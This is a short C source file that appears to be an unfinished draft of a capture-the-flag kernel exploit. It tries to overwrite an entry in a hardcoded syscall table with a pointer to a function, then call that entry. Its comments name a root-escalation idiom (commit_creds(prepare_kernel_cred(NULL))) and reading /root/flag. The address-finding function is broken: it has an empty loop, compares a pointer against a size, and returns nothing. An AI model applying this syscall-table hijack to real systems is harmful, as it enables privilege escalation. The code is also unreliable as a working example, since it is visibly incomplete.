#define SYS_CALL_TABLE 0x8000e348
#define SYS_UPPER 0xdf
#define SYS_EXPLOIT 0xe0

void read_flag()
{
	// Make sure to root up first.
	// commit_creds(prepare_kernel_cred(NULL));
	// Check what happens on: system("cat /root/flag");
}

void *get_read_flag_addr()
{
	void *read_flag_func = &read_flag;
	for (char *b = read_flag_func; b < sizeof(read_flag_func); b++)
	{
		if (b >= 0x41 && b <= 0x5a)
		{
		}
	}
}

void create_new_syscall()
{
	void **syscall_table = SYS_CALL_TABLE;
	void *read_flag_func = get_read_flag_addr();
	syscall(SYS_UPPER, &read_flag_func, &syscall_table[SYS_EXPLOIT]);
}

void call_new_syscall()
{
	syscall(SYS_EXPLOIT);
}

int main()
{
	create_new_syscall();
	call_new_syscall();
}
